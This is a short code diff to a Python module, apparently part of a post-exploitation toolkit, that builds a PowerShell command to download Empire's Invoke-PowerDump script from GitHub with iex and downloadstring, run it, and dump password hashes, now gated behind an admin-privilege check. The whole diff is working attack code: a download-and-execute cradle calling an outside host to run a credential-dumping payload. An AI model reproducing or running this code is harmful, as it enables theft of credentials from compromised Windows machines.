@@ -19,6 +19,14 @@ class CustomModule(Module):
 
     # This module must be always implemented, it is called by the run option
     def run_module(self):
-        function = "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1');"
-        function += 'Invoke-PowerDump'
+        function = """function PowerDump{
+            if (isadmin){
+                iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1');
+                Invoke-PowerDump;
+            }else {
+                return 'No admin privileges';
+            }
+        }
+        """
+        function += 'PowerDump'
         super(CustomModule, self).run(function)
